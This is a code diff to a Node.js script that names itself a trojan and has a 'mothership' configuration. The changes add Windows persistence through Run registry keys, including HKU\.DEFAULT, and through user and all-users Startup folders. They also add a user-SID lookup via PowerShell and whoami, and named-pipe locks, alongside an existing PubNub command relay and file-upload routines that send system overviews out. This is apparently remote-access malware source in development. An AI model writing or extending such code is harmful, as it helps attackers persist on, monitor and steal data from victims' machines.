@@ -1,5 +1,6 @@
 debugger;
 
+//#region documentation
 // https://github.com/gauravmehla/Javascript-bookshelf/blob/master/O'Reilly%20-%20You%20Don't%20Know%20JS.%20this%20%26%20Object%20Prototypes.pdf
 // https://www.tutorialspoint.com/compilers/online-nodejs-compiler.htm
 // https://onecompiler.com/nodejs#draft-yf7t
@@ -55,6 +56,7 @@ debugger;
 //              InstallNode
 //              CleanUp
 //              SelfDestruct
+//#endregion
 
 const path = require("path");
 module.paths.push(
@@ -82,20 +84,39 @@ for (let token of process.argv) {
     if (!token.includes("--inspect-brk")) process_argv.push(token);
 }
 
-// TODO: put in time parameter
 var taskconfig = {
     tasks: [
-        { name: "IdleTask", enabled: false },
-        { name: "RepTask", enabled: false },
-        { name: "TimeTask", enabled: false },
-        { name: "DailyTask", enabled: false },
+        {
+            name: "IdleTask",
+            enabled: false,
+            taskfunc: getIdleTaskXMLStr,
+            tasktime: 1,
+        },
+        {
+            name: "RepTask",
+            enabled: false,
+            taskfunc: getRepTaskXMLStr,
+            tasktime: 1,
+        },
+        {
+            name: "TimeTask",
+            enabled: false,
+            taskfunc: getTimeTaskXMLStr,
+            tasktime: 1,
+        },
+        {
+            name: "DailyTask",
+            enabled: false,
+            dailyfunc: getDailyTaskXMLStr,
+            tasktime: 1,
+        },
     ],
 
     getTaskTime(taskname) {
-        if (taskname.includes("RepTask") || taskname.includes("TimeTask"))
-            return "1";
-
-        return "5";
+        for (const task of this.tasks) {
+            if (task.name == taskname) return task.tasktime;
+        }
+        return -1;
     },
 
     getTaskXMLFunc(taskname) {
@@ -118,13 +139,6 @@ var taskconfig = {
 
         return arr;
     },
-
-    taskxmlfuncs: {
-        IdleTask: getIdleTaskXMLStr,
-        RepTask: getRepTaskXMLStr,
-        TimeTask: getTimeTaskXMLStr,
-        DailyTask: getDailyTaskXMLStr,
-    },
 };
 
 var regstartupconfig = {
@@ -139,16 +153,27 @@ var regstartupconfig = {
     },
 
     get reg_paths() {
-        return [this.hkcu_path, this.hklm_path, this.hku_path];
+        if (systemstate.istpl)
+            return [this.hkcu_path, this.hklm_path, this.hku_path];
+        else
+            return [
+                this.hkcu_path,
+                this.hklm_path,
+                this.hku_path,
+                this.hku_default_path,
+            ];
     },
 
     get new_item_str() {
         return "New-ItemProperty -Path $RegistryPath -Name $Name -Value $Value -PropertyType String -Force";
     },
 
+    get hku_default_path() {
+        return "HKU\\.DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+    },
+
     get hku_path() {
-        // TODO get UserSID using powershell
-        return "HKU:\\S-1-5-21-3405768669-439801778-3591577900-24511\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+        return `HKU:\\${systemstate.usersid}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
     },
 
     get hklm_path() {
@@ -244,7 +269,29 @@ var startupfolderconfig = {
         return tfolderpaths;
     },
 
-    folders: [
+    get folders() {
+        if (systemstate.istpl) {
+            return tpl_folders;
+        } else {
+            return client_folders;
+        }
+    },
+
+    client_folders: [
+        {
+            enabled: true,
+            name: "startup_activeusers",
+            folderpath: `C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
+        },
+        {
+            enabled: true,
+            name: "startup_allusers",
+            folderpath:
+                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+        },
+    ],
+
+    tpl_folders: [
         {
             enabled: true,
             name: "startup_allusers",
@@ -277,6 +324,9 @@ var systemconfig = {
         return path.join(systemstate.trojandir, this.launch_script_fname);
     },
 };
+
+// TODO implement
+var mothershipconfig = {};
 
 // TODO move over static configurations to systemconfig
 // TODO jobcode --> put in logic to grab jobcode from CmdConfig
@@ -326,15 +376,7 @@ var systemstate = {
     },
 
     get cmdtaskname() {
-        if (this.cmdname == "task" && process_argv.length >= 4) {
-            return process_argv[3];
-        }
-
-        return "";
-    },
-
-    get loopfname() {
-        return this.cmdname + "_running";
+        return this.cmdconfig.cmdtaskname;
     },
 
     get mothershipconfigfpath() {
@@ -408,6 +450,12 @@ var systemstate = {
             this.trojandir,
             "clientjobconfig_" + getRandomCode(8) + ".json"
         );
+    },
+
+    __usersid: "",
+
+    get usersid() {
+        return this.__usersid;
     },
 
     __clientid: "",
@@ -516,22 +564,6 @@ var systemstate = {
         return path.basename(this.scriptfpath);
     },
 
-    __jobcode: "",
-
-    get jobcode() {
-        return this.__jobcode;
-    },
-
-    set jobcode(value) {
-        this.__jobcode = value;
-    },
-
-    get batchid() {
-        if (!isNullOrWhitespace(this.jobcode)) return this.jobcode;
-
-        return this.sessionid;
-    },
-
     scriptts: getTimestamp(),
     __scriptmd5: "",
     get scriptmd5() {
@@ -564,22 +596,13 @@ var systemstate = {
     },
 
     get lockfname() {
-        let _fname = "";
-        _fname = this.trojanname + "_" + this.cmdname;
-        _fname +=
-            (!isNullOrWhitespace(this.cmdtaskname)
-                ? "_" + this.cmdtaskname
-                : "") + "_lock";
-
-        return _fname;
+        return this.cmdconfig.lockfname;
     },
 
     get statekvp() {
         return {
             clientid: this.clientid,
             sessionid: this.sessionid,
-            batchid: this.batchid,
-            jobcode: this.jobcode,
             script_version: this.script_version,
             source: this.source,
             scriptts: this.scriptts,
@@ -601,6 +624,7 @@ class CmdConfig {
     #__childprocess = null;
     #__childcmds = [];
     #__parentcmdconfig = null;
+    #__cmdconfig = null; // for cmds launched as a job -- final param should be path to json clinetjob object
 
     #__pubnubrelay = null;
 
@@ -621,6 +645,12 @@ class CmdConfig {
     }
 
     get config() {
+        if (this.#__cmdconfig) return this.#__cmdconfig;
+
+        if (["task", "watchdog", "cmdlist", "ping"].includes(this.cmdname)) {
+            return null;
+        }
+
         if (process_argv.length <= 3) {
             return null;
         }
@@ -628,7 +658,8 @@ class CmdConfig {
         let cmdconfig_json = readTag(process_argv[3]);
         let cmdconfig_obj = JSON.parse(cmdconfig_json);
 
-        return cmdconfig_obj;
+        this.#__cmdconfig = cmdconfig_obj;
+        return this.#__cmdconfig;
     }
 
     get childprocess() {
@@ -637,6 +668,14 @@ class CmdConfig {
 
     get launchscriptfname() {
         return this.#__launchscriptfname;
+    }
+
+    get cmdtaskname() {
+        if (this.cmdname == "task" && process_argv.length >= 4) {
+            return process_argv[3];
+        }
+
+        return "";
     }
 
     set cmdname(value) {
@@ -732,29 +771,31 @@ class CmdConfig {
         return pid;
     }
 
+    get lockfname() {
+        let _fname = "";
+        _fname = systemstate.trojanname + "_" + this.cmdname;
+        _fname +=
+            (!isNullOrWhitespace(this.cmdtaskname)
+                ? "_" + this.cmdtaskname
+                : "") + "_lock";
+
+        return "\\\\.\\pipe\\" + _fname;
+    }
+
     async activate(cmdlineargs, exitparent) {
         logmsg("starting");
 
-        if (!exitparent) exitparent = false;
+        let pipe_exists = await checkIfPipeExists(this.lockfname);
 
-        let tcmdpid = this.readcmdpid();
-
-        if (tcmdpid <= 0) {
-            this.launch();
-            logmsg("finished");
-            return;
+        if (pipe_exists) {
+            logmsg(
+                `no need to run [${this.cmdname}]-- pipe exists with name [${this.lockfname}]`
+            );
         }
 
-        let ispidalive = isPidAlive(tcmdpid);
+        let ret = await this.launch(cmdlineargs, !exitparent ? false : true);
 
-        if (!ispidalive) {
-            await this.launch(cmdlineargs, exitparent);
-            return;
-        }
-
-        logmsg(
-            `no need to launch -- [${this.cmdname}] cmd is running with pid=${tcmdpid}`
-        );
+        return ret;
     }
 
     // message handler -- used by parent cmds to process incoming messages from child cmds
@@ -1079,6 +1120,33 @@ class PubnubRelay {
 
 // ---
 
+function getusersid_whoami() {
+    // whoami /user /fo csv
+    // ("User Name", "SID");
+    // ("laptop-ue7q62ol\sebas", "S-1-5-21-435801507-4188035712-3236683676-1001");
+    return new Promise((resolve, reject) => {
+        exec("whoami /user /fo csv", (error, stdout, stderr) => {
+            if (error) {
+                reject(error);
+            }
+
+            if (!isNullOrWhitespace(stdout)) {
+                const lines = stdout.trim().split("\n");
+
+                if (lines.length > 1) {
+                    const row = lines[1].split(",");
+                    const sid = row[1].replace(/"/g, ""); // Removes wrapping quotes
+                    resolve(sid);
+                }
+            }
+
+            if (!isNullOrWhitespace(stderr)) resolve(stderr);
+
+            resolve("");
+        });
+    });
+}
+
 function getusersid() {
     return new Promise((resolve, reject) => {
         const psCommand = `(Get-LocalUser -Name "${systemstate.username}").SID.Value`;
@@ -1111,7 +1179,7 @@ function isChildHealthy(childProcess) {
 }
 
 function ensureSingleInstancePipe(initfunc) {
-    const PIPE_NAME = "\\\\.\\pipe\\" + systemstate.lockfname;
+    const PIPE_NAME = systemstate.lockfname;
 
     logmsg(`obtaining lock  ${PIPE_NAME}`);
 
@@ -1185,6 +1253,15 @@ async function exec_pslist() {
     );
 
     return pslisttxt;
+}
+
+async function checkIfPipeExists(pipePath) {
+    try {
+        const stats = await fs.stat(pipePath);
+        return stats.isFIFO();
+    } catch (error) {
+        return false;
+    }
 }
 
 function isInteger(str) {
@@ -1276,7 +1353,7 @@ function isUTF16LEBuffer(buffer) {
     return buffer[0] === 0xff && buffer[1] === 0xfe;
 }
 
-async function exec_wmic() {
+async function exec_wmic_process() {
     return new Promise((resolve, reject) => {
         const wmicCommand =
             "wmic process get ProcessId,Name,CommandLine /format:csv";
@@ -1296,7 +1373,7 @@ async function exec_wmic() {
 }
 
 async function getProcessList_wmic() {
-    let buffer = await exec_wmic();
+    let buffer = await exec_wmic_process();
     let isutf16le = isUTF16LEBuffer(buffer);
 
     let csvData = isutf16le
@@ -1510,7 +1587,6 @@ async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
 
     logmsg("request url: " + url.toString());
 
-    // anchor
     const request = new Request(url.toString(), {
         method: "PUT",
         body: fileBlob,
@@ -1779,15 +1855,21 @@ function getKey(obj, searchKey) {
 
 // --- startup
 
+(async () => {
+    systemstate.usersid = await getusersid();
+
+    if (isNullOrWhitespace(systemstate.usersid)) {
+        systemstate.usersid = await getusersid_whoami();
+    }
+})();
+
 let cmdarr = process_argv;
 let cmdarrstr = cmdarr ? cmdarr.join() : "";
 
 logmsg(
-    `starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid} -- ${cmdarrstr}`
+    `starting -- cmdname=${systemstate.cmdname} cmdtaskname=${systemstate.cmdtaskname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid} -- ${cmdarrstr}`
 );
 logmsg(`scriptmd5=${systemstate.scriptmd5}`);
-
-initProcessList();
 
 ensureSingleInstancePipe(systemstate.cmdconfig.cmdfunc);
 
@@ -3990,7 +4072,7 @@ async function getsystemoverview() {
         systemstate.statekvp,
         null,
         localfpath
-    ); // anchor
+    );
 
     logmsg(JSON.stringify(response));
 
